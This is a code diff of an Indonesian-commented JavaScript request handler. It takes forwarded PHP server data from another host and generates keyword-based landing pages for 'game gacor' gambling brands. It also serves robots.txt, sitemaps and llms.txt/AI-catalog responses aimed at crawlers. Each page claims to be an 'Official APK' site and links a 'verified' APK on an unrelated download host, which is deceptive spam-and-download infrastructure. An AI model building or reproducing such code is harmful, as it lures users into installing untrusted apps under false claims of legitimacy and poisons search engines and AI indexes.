@@ -1,7 +1,5 @@
-import { extractPHPSerializedValue } from '../utils/parser.js';
+import { escapeHtml, sanitizeText, extractPHPSerializedValue, generateCRC32Like } from '../utils/parser.js';
 import { handleAiMetadata } from '../utils/aiMetadata.js';
-import { getBrandSeoData } from '../utils/seoData.js';
-import { renderDownloadPage } from '../views/template.js';
 
 export async function onRequest(context) {
   const { request } = context;
@@ -10,10 +8,9 @@ export async function onRequest(context) {
   let requestURI = url.pathname;
   let queryString = url.search.replace('?', '');
   let httpHost = 'spin8vip.top';
-  let uriFilePost = '';
   let rawPostData = {};
 
-  // Tangkap kiriman POST dari Server 1 PHP
+  // 1. Tangkap POST dari Server 1
   if (request.method === 'POST') {
     try {
       const contentType = request.headers.get('content-type') || '';
@@ -27,117 +24,102 @@ export async function onRequest(context) {
         rawPostData = Object.fromEntries(new URLSearchParams(bodyText));
       }
 
-      // Sesuai dengan pengiriman PHP: array("x" => $serializedData)
       if (rawPostData.x) {
         const serializedData = rawPostData.x;
-        
-        // Ekstraksi variabel penting dari $_SERVER PHP yang diserialisasi
         const uriFromPost = extractPHPSerializedValue(serializedData, 'REQUEST_URI');
         const queryFromPost = extractPHPSerializedValue(serializedData, 'QUERY_STRING');
         let hostFromPost = extractPHPSerializedValue(serializedData, 'HTTP_HOST') || extractPHPSerializedValue(serializedData, 'SERVER_NAME');
-        const rawUriName = extractPHPSerializedValue(serializedData, 'uri_name');
 
         if (uriFromPost) requestURI = uriFromPost;
         if (queryFromPost) queryString = queryFromPost;
         if (hostFromPost) httpHost = hostFromPost;
-        
-        // Sinkronisasi uri_name (pembersihan string path .php)
-        if (rawUriName) {
-          const matchPhp = rawUriName.match(/^(\/[^\?]+\.php)/);
-          if (matchPhp) {
-            uriFilePost = matchPhp[1];
-          } else {
-            const phpIndex = rawUriName.indexOf('.php');
-            if (phpIndex !== -1) {
-              uriFilePost = rawUriName.substring(0, phpIndex + 4);
-            }
-          }
-        }
       }
     } catch (e) {}
-  } else {
-    return new Response("Method not allowed. Use POST.", { status: 405 });
   }
 
-  if (!httpHost) httpHost = url.host || 'spin8vip.top';
-  const pubHost = httpHost;
+  if (!httpHost) httpHost = 'spin8vip.top';
+
   const fullCheck = `${requestURI} ${queryString}`.toLowerCase();
 
-  // 1. Cek AI Metadata (llms.txt / ai-catalog.json)
-  const aiResponse = await handleAiMetadata(fullCheck, `https://${pubHost}`, url.origin);
+  // 2. Cek AI Metadata (llms.txt / ai-catalog.json)
+  const aiResponse = await handleAiMetadata(fullCheck, `https://${httpHost}`, url.origin);
   if (aiResponse) {
     return new Response(aiResponse.content, {
       headers: { "Content-Type": aiResponse.contentType }
     });
   }
 
-  // 2. Robots.txt
+  // 3. Handle Robots.txt
   if (fullCheck.includes('robots.txt')) {
-    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${pubHost}/sitemap-wp.xml`;
+    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
     return new Response(robotsOutput, { headers: { "Content-Type": "text/plain; charset=utf-8" } });
   }
 
-  // 3. Sitemap
+  // 4. Handle Sitemap
   if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
-    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${pubHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
+    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
     return new Response(sitemapOutput, { headers: { "Content-Type": "text/xml; charset=utf-8" } });
   }
 
-  // 4. Parsing Brand Query dari Path URL Server 1
+  // 5. Parsing Path & Abaikan .php untuk Halaman Utama Brand
   let cleanPath = requestURI.replace(/^\/+/, '');
-  let brandQuery = '';
-
   if (cleanPath.includes('.php')) {
     const phpParts = cleanPath.split('.php');
-    const afterPhp = phpParts[1] ? phpParts[1].replace(/^\/+/, '') : '';
-    
-    if (afterPhp) {
-      const subSegments = afterPhp.split('/').filter(Boolean);
-      brandQuery = subSegments[subSegments.length - 1];
-    }
+    cleanPath = phpParts[phpParts.length - 1].replace(/^\/+/, '');
   }
 
-  if (!brandQuery) {
-    const segments = cleanPath.split('/').filter(Boolean);
-    if (segments.length >= 2) {
-      brandQuery = segments[segments.length - 1];
-    } else if (segments.length === 1 && !segments[0].includes('.php')) {
-      brandQuery = segments[0];
-    }
-  }
-
-  if (!brandQuery && queryString) {
-    const queryClean = queryString.replace(/^[\/a-zA-Z_-]+\/+/i, '').replace(/^\/+/, '');
-    brandQuery = queryClean || queryString;
-  }
-
-  const blacklistedWords = ['install', 'download', 'apk', 'app', 'update', 'mobile', 'index.php', 'aby.php', 'api', 'endpoint'];
-  
-  if (!brandQuery || blacklistedWords.includes(brandQuery.toLowerCase()) || brandQuery.toLowerCase().endsWith('.php')) {
+  let brandQuery = '';
+  const segments = cleanPath.split('/').filter(Boolean);
+  if (segments.length > 0) {
+    brandQuery = segments[0];
+  } else if (queryString) {
+    brandQuery = queryString.replace(/^download\//i, '');
+  } else {
     brandQuery = 'default-app';
   }
 
-  try {
-    // 5. Ambil Data SEO berdasarkan brand yang dikirim dari PHP
-    const seoData = await getBrandSeoData(brandQuery, pubHost, url.origin);
-    
-    if (uriFilePost) {
-      seoData.downloadLink = `https://${pubHost}${uriFilePost}/${brandQuery}`;
+  const cleanBrandName = sanitizeText(brandQuery);
+  const finalBrandTitle = cleanBrandName || 'APLIKASI TERPERCAYA';
+  const uniqueHash = generateCRC32Like(brandQuery);
+
+  const customTitle = escapeHtml(`Situs Resmi Pendaftaran & Login ${finalBrandTitle} Terpercaya`);
+  const customDesc = escapeHtml(`Link alternatif resmi ${finalBrandTitle} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat.`);
+  const downloadLink = `https://download.store-files.com/apk/${uniqueHash}/${encodeURIComponent(brandQuery)}.apk`;
+
+  // 6. Template HTML Utama
+  const htmlTemplate = `<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>${customTitle}</title>
+  <meta name="description" content="${customDesc}">
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 40px 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
+    .card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); max-width: 440px; width: 100%; padding: 35px 25px; text-align: center; }
+    .logo-badge { display: inline-block; background: #3b82f6; color: #fff; font-size: 12px; font-weight: bold; padding: 6px 14px; border-radius: 20px; margin-bottom: 20px; letter-spacing: 1px; text-transform: uppercase; }
+    h1 { font-size: 20px; color: #fff; margin-bottom: 12px; line-height: 1.4; }
+    p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
+    .btn-download { display: block; background: #22c55e; color: #fff; text-align: center; padding: 15px 20px; border-radius: 10px; font-weight: bold; text-decoration: none; font-size: 16px; box-shadow: 0 4px 14px rgba(34, 197, 94, 0.4); transition: background 0.2s; }
+    .btn-download:hover { background: #16a34a; }
+    .footer-note { font-size: 12px; color: #64748b; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo-badge">Official APK</div>
+    <h1>${customTitle}</h1>
+    <p>${customDesc}</p>
+    <a href="${downloadLink}" class="btn-download">DOWNLOAD APK RESMI</a>
+    <div class="footer-note">Aman, Cepat, & Terverifikasi</div>
+  </div>
+</body>
+</html>`;
+
+  return new Response(htmlTemplate, {
+    headers: { 
+      "Content-Type": "text/html; charset=utf-8",
+      "Cache-Control": "public, max-age=600"
     }
-
-    // 6. Render HTML
-    const htmlTemplate = renderDownloadPage(seoData);
-
-    return new Response(htmlTemplate, {
-      headers: { 
-        "Content-Type": "text/html; charset=utf-8",
-        "Cache-Control": "public, max-age=600"
-      }
-    });
-  } catch (err) {
-    return new Response(`Internal Server Error: ${err.message}`, { 
-      status: 500,
-      headers: { "Content-Type": "text/plain; charset=utf-8" }
-    });
-  }
+  });
 }
